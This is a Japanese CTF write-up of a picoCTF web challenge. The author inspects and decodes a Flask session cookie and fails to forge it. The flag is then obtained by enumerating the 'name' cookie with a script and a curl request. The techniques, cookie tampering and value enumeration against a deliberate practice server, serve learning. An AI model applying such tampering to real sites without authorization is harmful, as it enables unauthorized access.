自力解答ならず。  

OWASP ZAPで``http://mercury.picoctf.net:21485/``に接続。  
``http://mercury.picoctf.net:21485/search``にPOSTしたら、

```
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://mercury.picoctf.net:21485/
Set-Cookie: name=-1; Path=/
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YnYvlA.tNQHCbGUilWsYdWrb-q_AmxM_1k; HttpOnly; Path=/
```

```
GET http://mercury.picoctf.net:21485/ HTTP/1.1
Host: mercury.picoctf.net:21485
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Referer: http://mercury.picoctf.net:21485/
Connection: keep-alive
Cookie: name=-1; session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YnYvlA.tNQHCbGUilWsYdWrb-q_AmxM_1k
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2398
Set-Cookie: session=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/

<!DOCTYPE html>
<html lang="en">
...
That doesn&#39;t appear to be a valid cookie.
...
</html>
```

不正なクッキーはすぐに削除されるらしい。  

``session``クッキーを解読してみる。  

```bash
$ echo -n "eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.YnYvlA.tNQHCbGUilWsYdWrb-q_AmxM_1k" | base64 -d
{"_flashes":[{" t":["danger","That doesn't appear to be a valid cookie."]}]}base64: invalid input
```

何回か``http://mercury.picoctf.net:21485/search``にPOSTしてみたが、１つ目の``.``より前の部分（"eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ"）は共通らしい。  

解読できた部分を``a.txt``に保存。  

```
{"_flashes":[{" t":["danger","That doesn't appear to be a valid cookie."]}]}
```

```bash
$ cat a.txt | base64
eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBh
IHZhbGlkIGNvb2tpZS4iXX1dfQo=
```

あれ、改行入るんか。じゃあこれならどうだ。  

```bash
$ cat a.txt | base64 | sed -z 's/\n//g' | base64 -d
{"_flashes":[{" t":["danger","That doesn't appear to be a valid cookie."]}]}
```

改行を除去してもいけるやん。  

じゃあ書き換えたjsonを``b.txt``に保存し、それをbase64エンコードしたものをクッキーの一部と入れ替えたら？  

```
{"_flashes":[{" t":["info","Give me a flag."]}]}
```

```bash
$ cat b.txt | base64 | sed -z 's/\n//g'
eyJfZmxhc2hlcyI6W3siIHQiOlsiaW5mbyIsIkdpdmUgbWUgYSBmbGFnLiJdfV19Cg==
```

駄目でした。  

### 正解

なぜ``name``クッキーを気にもとめなかったのか。  

プレースホルダーがヒントらしい。``scikerdoodle``をPOSTしたら``http://mercury.picoctf.net:21485/check``にリダイレクトする。このときの``name``クッキーの値は``0``。  

```html
<b>I love snickerdoodle cookies!<b>
```

OWASP ZAPで``301``がかえってきたところにブレークポイントを貼り、``name=1``にしてリダイレクト先を``http://mercury.picoctf.net:21485/check``に書き換えてみると、表示されるメッセージが少し異なる。  

```html
<b>I love chocolate chip cookies!<b>
```

``chocolate chip``をPOSTすると、``name``クッキーを``1``に書き換えたときと変わらない。  
``2``なら``I love oatmeal raisin cookies!``が表示される。  

二分探索するか。``100``はだめ。``50``もだめ。``25``はOk......。てかもうOWASP ZAPじゃなくてPythonでええわ。  

```bash
$ python3 crack.py
name=0: I love snickerdoodle cookies!
name=1: I love chocolate chip cookies!
name=2: I love oatmeal raisin cookies!
name=3: I love gingersnap cookies!
name=4: I love shortbread cookies!
name=5: I love peanut butter cookies!
name=6: I love whoopie pie cookies!
name=7: I love sugar cookies!
name=8: I love molasses cookies!
name=9: I love kiss cookies!
name=10: I love biscotti cookies!
name=11: I love butter cookies!
name=12: I love spritz cookies!
name=13: I love snowball cookies!
name=14: I love drop cookies!
name=15: I love thumbprint cookies!
name=16: I love pinwheel cookies!
name=17: I love wafer cookies!
name=18: invalid name.
name=19: I love macaroon cookies!
name=20: I love fortune cookies!
name=21: I love crinkle cookies!
name=22: I love icebox cookies!
name=23: I love gingerbread cookies!
name=24: I love tassie cookies!
name=25: I love lebkuchen cookies!
name=26: I love macaron cookies!
name=27: I love black and white cookies!
name=28: I love white chocolate macadamia cookies!
Traceback (most recent call last):
...
```

``name=28``で上限らしいのは手動で確認済みだからいいとして、``name=18``が気になる。  
ついでに言えば、``session``クッキーはなくてもまったく問題なかった。  

```bash
$ curl -H 'Referer: http://mercury.picoctf.net:21485/' -b 'name=18' http://mercury.picoctf.net:21485/check
```

フラグを入手した。おれの前半の無駄な努力は一体。  
